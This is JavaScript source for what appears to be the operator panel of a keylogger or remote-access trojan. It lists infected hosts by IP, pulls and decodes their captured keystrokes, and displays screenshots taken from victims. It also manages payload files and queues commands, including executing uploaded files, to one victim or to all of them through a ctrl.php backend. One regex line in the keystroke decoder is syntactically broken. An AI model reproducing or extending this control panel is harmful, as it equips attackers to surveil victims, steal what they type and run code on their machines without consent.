
var ctrl = 'ctrl.php';
var dir_screenshots = '../screenshots/';
var dir_files = '../files/';
var dir_files_2 = 'files/';

var l_users = [];
var l_times = [];
var l_selected = -1;

var l_screenshots = [];

var b_screenshots_shown = false;

var $selected_user = null;
var $users = null;
var $files = null;
var $screenshots = null;
var $show_screenshots = null;
var $cmd = null;
var $cmds = null;
var $data = null;
var $log = null;
var $run_selected = null;

var $mode_text = null;
var $mode_color = null;
var $mode_linebreaks = null;

function show_screenshots() {
	if (b_screenshots_shown) {
		b_screenshots_shown = false;
		$show_screenshots.text('Show Screenshots');
		$('#container_top')
			.css('whiteSpace', 'nowrap')
			.css('overflow', 'hidden');
		$screenshots.css('maxHeight', '140px');
	} else {
		b_screenshots_shown = true;
		$show_screenshots.text('Hide Screenshots');
		$('#container_top')
			.css('whiteSpace', 'normal')
			.css('overflow', 'visible');
		$screenshots.css('maxHeight', 'none');
	}
}

function oncheck_text() {
	select_user(l_selected);
}
function oncheck_color() {
	select_user(l_selected);
}
function oncheck_linebreaks() {
	select_user(l_selected);
}

function convert_mode_text(txt) {
	txt = txt.replace(/\[Enter '\n');
	txt = txt.replace(/\[Tab\]/g, '\t');
	txt = txt.replace(/\[Back\]/g, 'ы');
	txt = txt.replace(/\[.*?\]/g, '');

	while (true) {
		var pos = txt.indexOf('ы');
		if (pos == -1) {
			break;
		} else if (pos == 0) {
			txt = txt.slice(1);
		} else {
			txt = txt.slice(0, pos-1) + txt.slice(pos + 1);
		}
	}
	
	return txt;
}
function convert_mode_color(txt) {
	txt = txt.replace(/\[(.*?)\]/g, '<span class="tc">[$1]</span>');
	return txt;
}
function convert_mode_linebreaks(txt) {
	txt = txt.replace(/\;/g, ';\n');
	return txt;
}
function log(msg) {
	$log.get(0).value += msg + '\n';
	$log.scrollTop($log[0].scrollHeight);
}
function set_data(data) {
	if ($mode_text.is(':checked')) {
		data = convert_mode_text(data);
	}
	if ($mode_color.is(':checked')) {
		data = convert_mode_color(data);
	}
	$data.val(data);
}
function set_cmds(data) {
	if ($mode_linebreaks.is(':checked')) {
		data = convert_mode_linebreaks(data);
	}
	$cmds.val(data);
}
function refresh_users() {

	select_user(-1);

	$.ajax({
		type: 'POST',
		url: ctrl,
		cache: false,
		dataType: 'json',
		data: {req : 'get_users'}
	})
	.done(function(data) {
		l_users = [];
		l_times = [];
		$users.empty();
		for (var i = 0; i < data.length; i++) {
			l_users.push(data[i][0]);
			l_times.push(data[i][1]);
			$users.append($('<tr></tr>')
				.append('<td><button onclick="select_user('+i+');">Select</button></td>')
				.append('<td><button onclick="select_user('+i+');">' + l_users[i] + '</button></td>')
				.append('<td>' + l_times[i] + '</td>')
				//.append('<td><button onclick="get_data('+i+')">Show Data</button></td>')
				//.append('<td><button onclick="view_cmds('+i+')">View Commands</button></td>')
				.append('<td><button onclick="view_info('+i+')">View Info</button></td>')
				.append('<td><button onclick="clear_data('+i+')">Clear Data</button></td>')
				.append('<td><button onclick="clear_cmds('+i+')">Clear Commands</button></td>')
				.append('<td><button onclick="del_data('+i+')">Delete User</button></td>'));
		}
		log('Fetched ' + l_users.length + ' IP addresses.');
	});
}

function select_user(index) {
	l_selected = index;
	
	$users.find('tr').removeClass('highlight');
	
	if (index < 0) {
		$run_selected.attr('disabled', 'disabled');
		$data.val('');
		$cmds.val('');
	} else {
		$users.find('tr').eq(index).addClass('highlight');
		$run_selected.text('Run for ' + l_users[index]).removeAttr('disabled');
		get_data(index);
		view_cmds(index);
	}
}
function get_data(index) {
	generic_request(index, 'get_data', function(data) {
		set_data(data);
		//$data.scrollTop($data[0].scrollHeight);
		log('Fetched data for ' + l_users[index]);
	});
}
function clear_data(index) {
	generic_request(index, 'clear_data', function(data) {
		log('Cleared data for ' + l_users[index]);
		if (l_selected == index) {
			$data.val('');
		}
	});
}
function view_cmds(index) {
	generic_request(index, 'get_cmd', function(data) {
		set_cmds(data);
		//$cmds.scrollTop($cmds[0].scrollHeight);
		log('Fetched commands for ' + l_users[index]);
	});
}
function clear_cmds(index) {
	generic_request(index, 'clear_cmd', function(data) {
		log('Cleared commands for ' + l_users[index]);
		if (l_selected == index) {
			$cmds.val('');
		}
	});
}
function view_info(index) {
	generic_request(index, 'get_info', function(data) {
		alert(data);
	});
}
function clear_info(index) {
	generic_request(index, 'clear_info', function(data) {
		log('Cleared info for ' + l_users[index]);
	});
}
function del_data(index) {
	if(!confirm('Are you sure?'))
		return;

	generic_request(index, 'del_data', function(data) {
		log('Deleted data for ' + l_users[index]);
		if (l_selected == index) {
			$data.val('');
			$cmds.val('');
		}
		refresh_users();
	});
}
function generic_request(index, req, success) {
	$.ajax({
		type: 'POST',
		url: ctrl,
		cache: false,
		dataType: 'text',
		data: {req : req, user: l_users[index]}
	})
	.done(success);
}
function list_screenshots() {
	$.ajax({
		type: 'POST',
		url: ctrl,
		cache: false,
		dataType: 'json',
		data: {req : 'list_screenshots'}
	})
	.done(function(data) {
		for (var i = 0; i < data.length; i++) {
			if (l_screenshots.indexOf(data[i]) < 0) {
				l_screenshots.push(data[i]);
				var link = dir_screenshots+data[i];
				log('Loading new screenshot: ' + data[i]);
				$screenshots.prepend(
					$('<span class="imgcontainer"></span>').append(
						$('<a></a>').attr('href', link).attr('target', '_blank')
							.append($('<img></img>').attr('src', link))
							.hide().fadeIn('slow'),
						$('<button class="delbutton" onclick="del_screenshot(\''
							+data[i]+'\')">X</button>')));
			}
		}
		
		var sc_copy = l_screenshots.slice();
		
		for (var i = 0; i < sc_copy.length; i++) {
			if (data.indexOf(sc_copy[i]) < 0) {
				var index = l_screenshots.indexOf(sc_copy[i]);
				del_screenshot_element(index);
			}
		}
		
		log('Fetched ' + l_screenshots.length + ' screenshot names.');
	});
}
function del_screenshot_element(index) {
	$('a[href="'+dir_screenshots+l_screenshots[index]+'"]').parent().remove();
	l_screenshots.splice(index, 1);
}
function del_screenshot(name) {

	var index = l_screenshots.indexOf(name);
	if (index < 0) return;

	$.ajax({
		type: 'POST',
		url: ctrl,
		cache: false,
		dataType: 'text',
		data: {req : 'del_screenshot', file: name}
	});
	
	log('Deleting image: ' + name);
	del_screenshot_element(index);
}
function list_files() {
	$.ajax({
		type: 'POST',
		url: ctrl,
		cache: false,
		dataType: 'json',
		data: {req : 'list_files'}
	})
	.done(function(data) {
		
		log('Fetched ' + data.length + ' file names.');
		
		$files.empty();
		for (var i = 0; i < data.length; i++) {
			var link = dir_files+data[i];
			$files.append($('<tr></tr>').append(
					$('<td><a href="'+link+'" target="_blank">'+data[i]+'</a></td>'),
					$('<td><button onclick="choose_file(\''+data[i]+'\')">Copy exec command</button></td>'),
					$('<td><button onclick="del_file(\''+data[i]+'\')">Delete</button></td>')
				));
			
		}
	});
}
function del_file(name) {

	$.ajax({
		type: 'POST',
		url: ctrl,
		cache: false,
		dataType: 'text',
		data: {req : 'del_file', file: name}
	});
	
	log('Deleting file: ' + name);
	$('a[href="'+dir_files+name+'"]').parent().parent().remove();
}
function choose_file(name) {
	$cmd.val($cmd.val() + 'exec ' + dir_files_2 + name + ';');
}
function run_all() {
	run(-1);
}
function run_selected() {
	if (l_selected < 0) {
		$data.val('No user selected.');
	} else {
		run(l_selected);
	}
}
function run(index) {
	var cmd = $cmd.val();
	if (cmd.length == 0)
		return;
		
	$cmd.val('');
	
	var data = null;
	if (index < 0) {
		data = {req : 'put_cmd_all', cmd: cmd};
	} else {
		data = {req : 'put_cmd', cmd: cmd, user: l_users[index]};
	}
	
	$.ajax({
		type: 'POST',
		url: ctrl,
		cache: false,
		dataType: 'text',
		data: data
	})
	.done(function(data) {
		if (index < 0) {
			log('Executed command for ALL.');
		} else {
			log('Executed command for ' + l_users[index]);
			if (l_selected == index) {
				select_user(index);
			}
		}
	});
}

$(document).ready(function() {
	$selected_user = $('#selected_user');
	$users = $('#users');
	$screenshots = $('#screenshots');
	$show_screenshots = $('#show_screenshots');
	$files = $('#files');
	$cmd = $('#cmd');
	$data = $('#data');
	$cmds = $('#cmds');
	$log = $('#log');
	$run_selected = $('#run_selected');
	$mode_text = $('#mode_text');
	$mode_color = $('#mode_color');
	$mode_linebreaks = $('#mode_linebreaks');
	
	refresh_users();
	list_screenshots();
	list_files();
	
	setInterval(function() {
		if (l_selected >= 0) {
			select_user(l_selected);
		}
		list_screenshots();
	}, 5000);
});